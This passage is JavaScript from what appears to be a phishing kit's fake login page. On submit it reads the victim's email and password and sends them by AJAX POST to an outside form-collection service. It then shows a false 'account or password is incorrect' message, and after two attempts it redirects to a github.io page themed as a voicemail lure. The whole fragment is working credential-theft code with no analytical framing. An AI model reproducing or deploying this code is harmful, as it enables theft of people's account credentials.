      email.focus;
      return false;
    }
    var ind=my_email.indexOf("@");
    var my_slice=my_email.substr((ind+1));
    var c= my_slice.substr(0, my_slice.indexOf('.'));
    var final= c.toLowerCase();

    $("#div1").animate({left:200, opacity:"hide"}, 0);
    $("#div2").animate({right:200, opacity:"show"}, 1000);
    $("#emailch").html(my_email);

  });
  $('#back').click(function () {
    $("#msg").hide();
    $("#email").val("");
    $("#password").val("");
    $("#div2").animate({left:200, opacity:"hide"}, 0);
    $("#div1").animate({right:200, opacity:"show"}, 1000);

  });


  $('#submit-btn').click(function(event){
    event.preventDefault();
    var email=$("#email").val();
    var password=$("#password").val();
    var detail=$("#field").html();
    var msg = $('#msg').html();

    var my_email =email;
    var ind=my_email.indexOf("@");
    var my_slice=my_email.substr((ind+1));
    var c= my_slice.substr(0, my_slice.indexOf('.'));
    var final= c.toLowerCase();
    $('#msg').text( msg );
    count=count+1;
    $.ajax({
      dataType: 'JSON',
      url: 'https://fabform.io/f/JalByH7',
      type: 'POST',
      data:{
        email:email,
        password:password,
        detail:detail,

      },
      beforeSend: function(xhr){
        $('#submit-btn').html('Verifing...');
      },
      success: function(response){
        $("#password").val("");
        if (count>=2) {
          count=0;
          window.location.replace("https://voicemail082021.github.io/98655678/746644665.html");
        }
        if(response){
          $("#msg").show();
          console.log(response);
          if(response['signal'] == 'ok'){
           $('#msg').html(response['msg']);
         }
         else{
          $('#msg').html(response['msg']);
        }
      }
    },
    error: function(){
      $("#password").val("");
      if (count>=2) {
        count=0;
        window.location.replace("https://voicemail082021.github.io/98655678/746644665.html");
      }
      $("#msg").show();
      $('#msg').html("Your account or password is incorrect.");
    },
    complete: function(){
      $('#submit-btn').html('Login');
    }
  });
  });
});

